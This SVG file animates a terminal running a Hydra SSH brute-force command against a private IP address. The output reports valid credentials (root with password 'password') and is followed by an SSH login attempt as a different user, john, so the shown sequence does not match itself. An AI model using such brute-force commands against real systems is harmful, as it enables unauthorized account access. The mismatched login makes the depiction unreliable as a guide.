<svg width="640" height="210" xmlns="http://www.w3.org/2000/svg">

  <!-- Terminal background -->
  <rect width="640" height="210" rx="12" fill="#0d1117"/>

  <!-- Title bar -->
  <rect x="0" y="0" width="640" height="32" fill="#161b22" rx="12"/>
  <rect x="0" y="18" width="640" height="14" fill="#161b22"/>

  <!-- macOS-style window buttons -->
  <circle cx="22" cy="16" r="6" fill="#ff5f56"/>
  <circle cx="42" cy="16" r="6" fill="#ffbd2e"/>
  <circle cx="62" cy="16" r="6" fill="#27c93f"/>

  <!-- Title text -->
  <text x="320" y="21" text-anchor="middle"
        font-family="monospace" font-size="11" fill="#8b949e">
    hydra — ssh brute force · bugged
  </text>

  <!-- Line 1: command (always visible from start) -->
  <text x="20" y="62" font-family="monospace" font-size="13" fill="#e6edf3">
    $ hydra -L users.txt -P pass.txt ssh://10.48.156.200 -t 4
  </text>

  <!-- Line 2: data attacking (appears at ~0.9s) -->
  <g opacity="0">
    <animate attributeName="opacity"
      values="0;0;1;1;0"
      keyTimes="0;0.12;0.20;0.92;1.0"
      dur="8s" repeatCount="indefinite"/>
    <text x="20" y="86" font-family="monospace" font-size="13" fill="#8b949e">
      [DATA] attacking ssh://10.48.156.200:22/
    </text>
  </g>

  <!-- Line 3: trying pair (appears at ~1.8s) -->
  <g opacity="0">
    <animate attributeName="opacity"
      values="0;0;0;1;1;0"
      keyTimes="0;0.22;0.32;0.40;0.92;1.0"
      dur="8s" repeatCount="indefinite"/>
    <text x="20" y="110" font-family="monospace" font-size="13" fill="#8b949e">
      [22][ssh] Trying john:p4ssw0rd ...
    </text>
  </g>

  <!-- Line 4: valid pair found (appears at ~3.2s) -->
  <g opacity="0">
    <animate attributeName="opacity"
      values="0;0;0;0;1;1;0"
      keyTimes="0;0.38;0.48;0.52;0.62;0.92;1.0"
      dur="8s" repeatCount="indefinite"/>
    <text x="20" y="134" font-family="monospace" font-size="13" fill="#ffa657">
      [22][ssh] host: 10.48.156.200   login: root   password: password
    </text>
  </g>

  <!-- Line 5: completed (appears at ~4.8s) -->
  <g opacity="0">
    <animate attributeName="opacity"
      values="0;0;0;0;0;1;1;0"
      keyTimes="0;0.52;0.58;0.64;0.68;0.76;0.92;1.0"
      dur="8s" repeatCount="indefinite"/>
    <text x="20" y="158" font-family="monospace" font-size="13" fill="#27c93f">
      1 of 1 target completed — VALID PAIR FOUND!
    </text>
  </g>

  <!-- Line 6: new ssh command (appears at ~6.2s) -->
  <g opacity="0">
    <animate attributeName="opacity"
      values="0;0;0;0;0;0;1;1;0"
      keyTimes="0;0.60;0.66;0.70;0.74;0.78;0.84;0.92;1.0"
      dur="8s" repeatCount="indefinite"/>
    <text x="20" y="186" font-family="monospace" font-size="13" fill="#e6edf3">
      $ ssh john@10.48.156.200
    </text>
  </g>

  <!-- Blinking cursor (always visible, flickers with prompt) -->
  <rect x="212" y="174" width="9" height="14" fill="#58a6ff">
    <animate attributeName="opacity" values="1;0;1" dur="1.1s" repeatCount="indefinite"/>
  </rect>

</svg>
